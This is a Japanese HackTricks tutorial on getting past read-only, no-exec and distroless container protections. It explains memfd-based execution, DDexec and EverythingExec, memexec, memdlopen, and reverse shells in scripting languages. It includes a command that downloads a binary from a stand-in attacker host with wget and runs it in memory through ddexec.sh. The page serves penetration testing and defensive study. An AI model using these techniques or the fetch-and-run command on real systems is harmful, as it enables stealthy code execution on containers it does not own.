# バイパスFS保護: 読み取り専用 / 実行不可 / Distroless

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
* **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**ハッキングキャリア**に興味がある方や**解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

## 動画

以下の動画では、このページで言及されているテクニックがより詳しく説明されています:

* [**DEF CON 31 - Linuxメモリ操作の探索**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ngとインメモリdlopen()によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## 読み取り専用 / 実行不可シナリオ

**読み取り専用（ro）ファイルシステム保護**が**Linuxマシン**で**より一般的**になってきており、特にコンテナで見られます。これは、roファイルシステムでコンテナを実行するのは、`securitycontext`で**`readOnlyRootFilesystem: true`**を設定するだけで簡単だからです:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能のままなので、ディスクに書き込むことができないわけではありません。ただし、このフォルダは**実行不可保護**でマウントされるため、ここにバイナリをダウンロードしても**実行できません**。

{% hint style="warning" %}
レッドチームの観点からすると、これにより、システムにないバイナリ（バックドアや`kubectl`のような列挙ツール）を**ダウンロードして実行するのが複雑**になります。
{% endhint %}

## 最も簡単なバイパス: スクリプト

バイナリを言及しましたが、インタプリタがマシン内にある限り、**シェルスクリプト**（`sh`がインストールされている場合）や**Pythonスクリプト**（`python`がインストールされている場合）など、**任意のスクリプトを実行**できます。

ただし、これだけではバイナリバックドアや他の実行する必要があるバイナリツールを実行するのには十分ではありません。

## メモリバイパス

ファイルシステムがそれを許可していない場合にバイナリを実行したい場合、**メモリから実行**するのが最善です。なぜなら、**保護がそこには適用されない**からです。

### FD + exec syscall バイパス

マシン内に**Python**、**Perl**、**Ruby**などの強力なスクリプトエンジンがある場合、メモリから実行するためにバイナリをダウンロードし、メモリファイルディスクリプタに保存し（`create_memfd`システムコール）、これらの保護によって保護されないため、**fdをファイルとして実行する**という**`exec`システムコール**を呼び出すことができます。

これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、**バイナリが圧縮されb64エンコード**されたスクリプトが生成され、`create_memfd`システムコールを呼び出して**バイナリを保存**し、**exec**システムコールを呼び出して実行する**手順**が記述された指定された言語のスクリプトが生成されます。

{% hint style="warning" %}
これは、PHPやNodeなどの他のスクリプト言語では**スクリプトから生のシステムコールを呼び出すデフォルトの方法**がないため、`create_memfd`を呼び出して**バイナリを保存するためのメモリfd**を作成することはできません。

また、`/dev/shm`内のファイルで**通常のfd**を作成しても、**実行不可保護**が適用されるため、実行できません。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、**`/proc/self/mem`**を上書きすることで、**自分自身のプロセスのメモリを変更**する技術であり、**プロセスが実行しているアセンブリコード**を制御することで、**シェルコード**を書き込み、プロセスを**任意のコードを実行**するように「変異」させることができます。

{% hint style="success" %}
**DDexec / EverythingExec**を使用すると、**自分自身のシェルコード**または**メモリ**から**任意のバイナリ**を**ロードして実行**できます。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec)はDDexecの自然な次のステップです。これは**DDexecシェルコードをデーモン化**したもので、異なるバイナリを実行したいときには、DDexecを再起動する必要はありません。代わりに、DDexec技術を使用してmemexecシェルコードを実行し、**このデーモンと通信して新しいバイナリをロードして実行**することができます。

**memexecを使用してPHPリバースシェルからバイナリを実行する例**は、[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)にあります。

### Memdlopen

DDexecと同様の目的を持つ[**memdlopen**](https://github.com/arget13/memdlopen)技術は、後で実行するためにメモリにバイナリをロードする**簡単な方法**を提供します。これにより、依存関係を持つバイナリをロードすることさえ可能になります。

## Distroless Bypass

### Distrolessとは

Distrolessコンテナには、ライブラリやランタイム依存関係など、**特定のアプリケーションやサービスを実行するために必要な最小限のコンポーネント**のみが含まれており、パッケージマネージャーやシェル、システムユーティリティなどのより大きなコンポーネントは除外されています。

Distrolessコンテナの目標は、**不要なコンポーネントを排除**することにより、コンテナの攻撃面を減らし、悪用される可能性のある脆弱性の数を最小限に抑えることです。

### リバースシェル

Distrolessコンテナでは、通常のシェルを取得するための`sh`や`bash`などが**見つからない**かもしれません。また、`ls`、`whoami`、`id`などのバイナリも見つけることはできません。これらは通常システムで実行するものです。

{% hint style="warning" %}
したがって、通常どおりに**リバースシェルを取得**したり、システムを**列挙**することはできません。
{% endhint %}

ただし、侵害されたコンテナが例えばflask webを実行している場合、Pythonがインストールされているため、**Pythonリバースシェル**を取得できます。Nodeを実行している場合はNodeリバースシェルを取得でき、ほとんどの**スクリプト言語**でも同様です。

{% hint style="success" %}
スクリプト言語を使用すると、言語の機能を使用してシステムを**列挙**することができます。
{% endhint %}

**`read-only/no-exec`**の保護がない場合、リバースシェルを悪用してファイルシステムに**バイナリを書き込み**、それらを**実行**することができます。

{% hint style="success" %}
ただし、この種のコンテナでは通常これらの保護が存在しますが、**以前のメモリ実行技術を使用してそれらをバイパス**することができます。
{% endhint %}

**いくつかのRCE脆弱性を悪用して**、スクリプト言語の**リバースシェル**を取得し、メモリからバイナリを実行する方法の**例**は、[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)にあります。

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**ハッキングキャリア**に興味がある方や、**解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したり、**HackTricksをPDFでダウンロード**したりするには、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**してください。

</details>
